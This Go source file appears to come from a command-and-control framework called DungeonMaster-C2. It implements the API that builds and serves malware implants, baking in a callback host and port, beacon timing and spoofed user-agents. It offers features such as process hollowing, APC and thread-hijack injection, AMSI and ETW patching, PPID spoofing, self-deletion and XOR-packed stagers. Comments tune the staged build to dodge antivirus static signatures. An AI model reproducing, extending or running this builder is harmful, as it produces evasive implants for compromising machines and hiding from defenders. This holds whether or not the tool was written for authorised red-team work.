package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/storage"
	"github.com/google/uuid"
	"go.uber.org/zap"
)

type buildView struct {
	ID          string     `json:"id"`
	CampaignID  string     `json:"campaign_id,omitempty"`
	Status      string     `json:"status"`
	TargetOS    string     `json:"target_os"`
	TargetArch  string     `json:"target_arch"`
	ArtifactURL string     `json:"artifact_url,omitempty"`
	SHA256      string     `json:"sha256,omitempty"`
	CreatedAt   time.Time  `json:"created_at"`
	CompletedAt *time.Time `json:"completed_at,omitempty"`
}

func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Config struct {
			CampaignID    string   `json:"campaign_id"`
			ListenerID    string   `json:"listener_id"`
			ProfileName   string   `json:"profile_name"`
			TargetOS      string   `json:"target_os"`
			TargetArch    string   `json:"target_arch"`
			SleepSeconds  int      `json:"sleep_seconds"`
			JitterPct     int      `json:"jitter_pct"`
			Ephemeral     bool     `json:"ephemeral"`
			TLSSkipVerify bool     `json:"tls_skip_verify"`
			SleepEncrypt  bool     `json:"sleep_encrypt"`
			Features      []string `json:"features"`
		} `json:"config"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body")
		return
	}

	cfg := req.Config
	if cfg.SleepSeconds == 0 {
		cfg.SleepSeconds = 30
	}
	if cfg.JitterPct == 0 {
		cfg.JitterPct = 20
	}
	if cfg.TargetOS == "" {
		cfg.TargetOS = "windows"
	}
	if cfg.TargetArch == "" {
		cfg.TargetArch = "x64"
	}

	// Resolve listener host/port from DB.
	// bind_host is the server-side listen address (often 0.0.0.0); agents need a
	// routable callback address, so we fall back to 127.0.0.1 (host loopback via
	// Docker port-mapping) when the bind address is not specific.
	// For cross-network testing, set a real hostname or IP in the listener's bind_host field.
	listenerHost := "127.0.0.1"
	listenerPort := 4443
	if cfg.ListenerID != "" {
		var host string
		var port int
		err := db.Pool.QueryRow(r.Context(),
			`SELECT bind_host, bind_port FROM listeners WHERE id = $1`, cfg.ListenerID,
		).Scan(&host, &port)
		if err == nil {
			if host != "" && host != "0.0.0.0" {
				listenerHost = host
			}
			listenerPort = port
		}
	}

	operatorID := operatorIDFromCtx(r.Context())
	buildUUID := uuid.New().String()

	var campaignID *string
	if cfg.CampaignID != "" && cfg.CampaignID != "00000000-0000-0000-0000-000000000000" {
		campaignID = &cfg.CampaignID
	}

	evasionFlags := fmt.Sprintf(`{"ephemeral":%v}`, cfg.Ephemeral)

	var b buildView
	err := db.Pool.QueryRow(r.Context(), `
		INSERT INTO builds (campaign_id, operator_id, target_os, target_arch,
		                    listener_id, sleep_seconds, jitter_pct, evasion_flags, ephemeral, build_uuid)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8::jsonb, $9, $10)
		RETURNING id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		          COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at`,
		campaignID, operatorID, cfg.TargetOS, cfg.TargetArch,
		nilIfEmpty(cfg.ListenerID), cfg.SleepSeconds, cfg.JitterPct,
		evasionFlags, cfg.Ephemeral, buildUUID,
	).Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
		&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt)
	if err != nil {
		g.log.Error("create build record", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "create failed")
		return
	}

	// Kick off the build in the background
	go g.runBuild(b.ID, cfg.CampaignID, listenerHost, strconv.Itoa(listenerPort),
		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.TLSSkipVerify, cfg.SleepEncrypt, cfg.Features)

	writeJSON(w, http.StatusCreated, b)
}

func (g *gateway) handleGetBuild(w http.ResponseWriter, r *http.Request) {
	var b buildView
	err := db.Pool.QueryRow(r.Context(), `
		SELECT id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		       COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at
		FROM builds WHERE id = $1`, r.PathValue("id"),
	).Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
		&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt)
	if err != nil {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	writeJSON(w, http.StatusOK, b)
}

func (g *gateway) handleListBuilds(w http.ResponseWriter, r *http.Request) {
	campaignID := r.URL.Query().Get("campaign_id")

	query := `
		SELECT id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		       COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at
		FROM builds WHERE 1=1`
	args := []any{}
	n := 1
	if campaignID != "" {
		query += fmt.Sprintf(" AND campaign_id = $%d", n)
		args = append(args, campaignID)
		n++
	}
	query += " ORDER BY created_at DESC LIMIT 50"

	rows, err := db.Pool.Query(r.Context(), query, args...)
	if err != nil {
		g.log.Error("list builds", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "list failed")
		return
	}
	defer rows.Close()

	var out []buildView
	for rows.Next() {
		var b buildView
		if err := rows.Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
			&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt); err != nil {
			writeError(w, http.StatusInternalServerError, "scan failed")
			return
		}
		out = append(out, b)
	}
	if out == nil {
		out = []buildView{}
	}
	writeJSON(w, http.StatusOK, out)
}

// runBuild executes the Docker build in a background goroutine and updates the build record.
func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, tlsSkipVerify, sleepEncrypt bool, features []string) {

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()

	setBuildStatus := func(status string, artifactURL, sha256 string) {
		_, err := db.Pool.Exec(context.Background(), `
			UPDATE builds SET status = $2, artifact_url = NULLIF($3,''), sha256 = NULLIF($4,''), completed_at = NOW()
			WHERE id = $1`, buildID, status, artifactURL, sha256)
		if err != nil {
			g.log.Error("update build status", zap.String("build_id", buildID), zap.Error(err))
		}
	}

	_, _ = db.Pool.Exec(context.Background(), `UPDATE builds SET status = 'building' WHERE id = $1`, buildID)

	// Resolve cross-compile target and artifact names from TargetOS/TargetArch
	cargoTarget, binName, ext := resolveTarget(targetOS, targetArch)

	// Resolve malleable profile fields (paths, user-agent)
	regPath, pollPath, userAgent := "/r", "/c", ""
	if profileName != "" {
		var ua, rp, pp string
		err := db.Pool.QueryRow(ctx,
			`SELECT user_agent, register_path, poll_path FROM c2_profiles WHERE name = $1`, profileName,
		).Scan(&ua, &rp, &pp)
		if err == nil {
			userAgent, regPath, pollPath = ua, rp, pp
		} else {
			g.log.Warn("profile not found, using defaults", zap.String("profile", profileName))
		}
	}

	imageTag := "dm-agent-build-" + buildID

	tlsSkipVerifyStr := "false"
	if tlsSkipVerify {
		tlsSkipVerifyStr = "true"
	}

	sleepEncryptStr := "false"
	if sleepEncrypt {
		sleepEncryptStr = "true"
	}

	featuresArg := ""
	if len(features) > 0 {
		allowed := map[string]bool{
			"inject-classic": true, "inject-apc": true, "inject-hollow": true,
			"inject-hijack": true, "inject-stomp": true, "unhook": true,
			"etw-patch": true, "amsi-patch": true, "ppid-spoof": true,
			"heap-encrypt": true, "stack-spoof": true, "udrl": true, "staged-payload": true,
			"self-delete": true, "channel-tcp": true, "channel-smb": true,
			"sleep-encrypt": true, "process-hollow": true, "pack-stager": true,
		}
		var validated []string
		for _, f := range features {
			if allowed[f] {
				validated = append(validated, f)
			}
		}
		if len(validated) > 0 {
			featuresArg = strings.Join(validated, ",")
		}
	}

	buildVolume := os.Getenv("DM_BUILD_VOLUME")
	if buildVolume == "" {
		buildVolume = "dungeonmaster_build_artifacts"
	}

	contentType := "application/octet-stream"
	if ext == ".exe" {
		contentType = "application/vnd.microsoft.portable-executable"
	}

	// For staged-payload builds, build the companion full-agent payload FIRST.
	// The stager bakes DM_BUILD_UUID=buildID and fetches /stage/{buildID} at runtime.
	// The server serves the companion payload (no staged-payload feature) from that endpoint.
	//
	// The stager is compiled with a minimal feature set (only what it needs to stage).
	// Evasion features like etw-patch/amsi-patch belong in the payload only — they run
	// inside the hollowed process. Including them in the stager adds static signatures to
	// a binary that BD scans before the hollow even happens.
	if strings.Contains(featuresArg, "staged-payload") {
		payloadFeatures := removeFeature(featuresArg, "staged-payload")
		payloadImageTag := "dm-payload-build-" + buildID

		// Cargo always produces the binary named after the package (binName = "dm-agent.exe").
		// DM_BIN must match the cargo output so the Dockerfile cp succeeds.
		payloadArgs := makeAgentBuildArgs(payloadImageTag, cargoTarget, binName, c2Host, c2Port,
			regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
			sleepEncryptStr, payloadFeatures, campaignID, false)

		payloadCmd := exec.CommandContext(ctx, "docker", payloadArgs...)
		payloadCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
		payloadCmd.Stdout = os.Stdout
		payloadCmd.Stderr = os.Stderr
		if err := payloadCmd.Run(); err != nil {
			g.log.Error("docker build payload failed", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}

		payloadOut := "/artifacts/" + buildID + "-payload" + ext
		payloadExtract := exec.CommandContext(ctx,
			"docker", "run", "--rm",
			"-v", buildVolume+":/out",
			payloadImageTag, "sh", "-c", "cp /"+binName+" /out/"+buildID+"-payload"+ext,
		)
		if err := payloadExtract.Run(); err != nil {
			g.log.Error("docker extract payload failed", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}

		exec.Command("docker", "rmi", payloadImageTag).Run() //nolint

		if _, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+"-payload"+ext, payloadOut, contentType); err != nil {
			g.log.Error("minio upload payload failed", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}
		os.Remove(payloadOut)
		g.log.Info("payload companion ready", zap.String("build_id", buildID), zap.String("key", buildID+"-payload"+ext))
	}

	// When pack-stager is requested the stager is XOR-encrypted and wrapped in a
	// tiny decryptor stub (dm-stub.exe).  The artifact delivered to the operator
	// is dm-stub.exe; the raw stager never leaves the build container.
	packStager := strings.Contains(featuresArg, "pack-stager")
	// Remove pack-stager from the feature list passed to Cargo — it is a build-pipeline
	// directive, not a Cargo feature.
	featuresArg = removeFeature(featuresArg, "pack-stager")

	// For staged-payload builds use a minimal stager feature set so evasion code
	// (etw-patch, amsi-patch, etc.) doesn't appear in the stager binary's .text.
	stagerFeatures := featuresArg
	if strings.Contains(featuresArg, "staged-payload") {
		stagerFeatures = buildStagerFeatures(featuresArg)
	}

	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
		sleepEncryptStr, stagerFeatures, campaignID, packStager)

	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
	buildCmd.Stdout = os.Stdout
	buildCmd.Stderr = os.Stderr
	if err := buildCmd.Run(); err != nil {
		g.log.Error("docker build failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	// When packing, the operator artifact is dm-stub.exe; dm-agent.exe is the raw
	// stager embedded inside the stub and is discarded after the build.
	extractBin := binName
	if packStager {
		extractBin = "dm-stub" + ext
	}

	outPath := "/artifacts/" + buildID + ext
	extractCmd := exec.CommandContext(ctx,
		"docker", "run", "--rm",
		"-v", buildVolume+":/out",
		imageTag, "sh", "-c", "cp /"+extractBin+" /out/"+buildID+ext,
	)
	if err := extractCmd.Run(); err != nil {
		g.log.Error("docker extract failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	exec.Command("docker", "rmi", imageTag).Run() //nolint

	artifactURL, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+ext, outPath, contentType)
	if err != nil {
		g.log.Error("minio upload failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	downloadURL, _ := storage.PresignedDownloadURL(ctx, storage.BucketArtifacts, buildID+ext)
	if downloadURL == "" {
		downloadURL = artifactURL
	}

	setBuildStatus("complete", downloadURL, "")
	g.log.Info("build complete", zap.String("build_id", buildID), zap.String("url", downloadURL))

	os.Remove(outPath)
}

func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
	regPath, pollPath string, sleepSecs, jitterPct int,
	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string,
	packStager bool) []string {

	packStr := "false"
	if packStager {
		packStr = "true"
	}

	args := []string{
		"build",
		"-f", "/workspace/deploy/docker/Dockerfile.agent",
		"--build-arg", "DM_TARGET=" + cargoTarget,
		"--build-arg", "DM_BIN=" + binName,
		"--build-arg", "DM_C2_HOST=" + c2Host,
		"--build-arg", "DM_C2_PORT=" + c2Port,
		"--build-arg", "DM_C2_PATH_REG=" + regPath,
		"--build-arg", "DM_C2_PATH_POLL=" + pollPath,
		"--build-arg", "DM_SLEEP_SECS=" + strconv.Itoa(sleepSecs),
		"--build-arg", "DM_JITTER_PCT=" + strconv.Itoa(jitterPct),
		"--build-arg", "DM_BUILD_UUID=" + buildID,
		"--build-arg", "DM_TLS_SKIP_VERIFY=" + tlsSkipVerify,
		"--build-arg", "DM_NO_EVASION=false",
		"--build-arg", "DM_UA=" + userAgent,
		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncrypt,
		"--build-arg", "DM_FEATURES=" + features,
		"--build-arg", "DM_PACK_STAGER=" + packStr,
	}
	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
		args = append(args, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
	}
	args = append(args, "-t", imageTag, "/workspace")
	return args
}

func removeFeature(features, remove string) string {
	parts := strings.Split(features, ",")
	kept := parts[:0]
	for _, p := range parts {
		if p != remove {
			kept = append(kept, p)
		}
	}
	return strings.Join(kept, ",")
}

// resolveTarget maps UI target_os/target_arch to Cargo triple, binary name, and file extension.
func resolveTarget(targetOS, targetArch string) (cargoTarget, binName, ext string) {
	switch targetOS {
	case "linux":
		switch targetArch {
		default:
			return "x86_64-unknown-linux-musl", "dm-agent", ""
		}
	default: // windows
		return "x86_64-pc-windows-gnu", "dm-agent.exe", ".exe"
	}
}

func nilIfEmpty(s string) *string {
	if s == "" {
		return nil
	}
	return &s
}

// buildStagerFeatures returns the subset of features the stager binary should be
// compiled with. The stager only needs to download the payload and hollow/inject it;
// evasion features (etw-patch, amsi-patch, sleep-encrypt, heap-encrypt, etc.) belong
// in the companion payload which runs inside the hollowed process.
func buildStagerFeatures(allFeatures string) string {
	stagerAllowed := map[string]bool{
		"staged-payload": true,
		"udrl":           true,
		"process-hollow": true,
		"ppid-spoof":     true,
		"channel-tcp":    true,
		"channel-smb":    true,
	}
	var kept []string
	for _, f := range strings.Split(allFeatures, ",") {
		if stagerAllowed[f] {
			kept = append(kept, f)
		}
	}
	return strings.Join(kept, ",")
}
